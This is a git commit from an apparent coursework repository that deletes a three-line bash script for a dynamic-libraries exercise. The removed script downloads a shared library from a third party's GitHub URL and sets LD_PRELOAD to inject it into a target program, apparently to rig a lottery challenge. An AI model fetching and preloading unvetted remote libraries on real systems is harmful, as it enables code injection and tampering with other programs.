f1691dfdee3508668f3ed6c8422eba5606814740
Mathias Owa Martins <owamathias@gmail.com>
2024-02-06 21:04:21 +0100

    Deleted 0x18-dynamic_libraries directory for deferment purposes

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget -P .. https://raw.githubusercontent.com/montybasquiart/alx-low_level_programming/master/0x18-dynamic_libraries/lib_gigamillions.so 
-export LD_PRELOAD="$PWD/../lib_gigamillions.so"
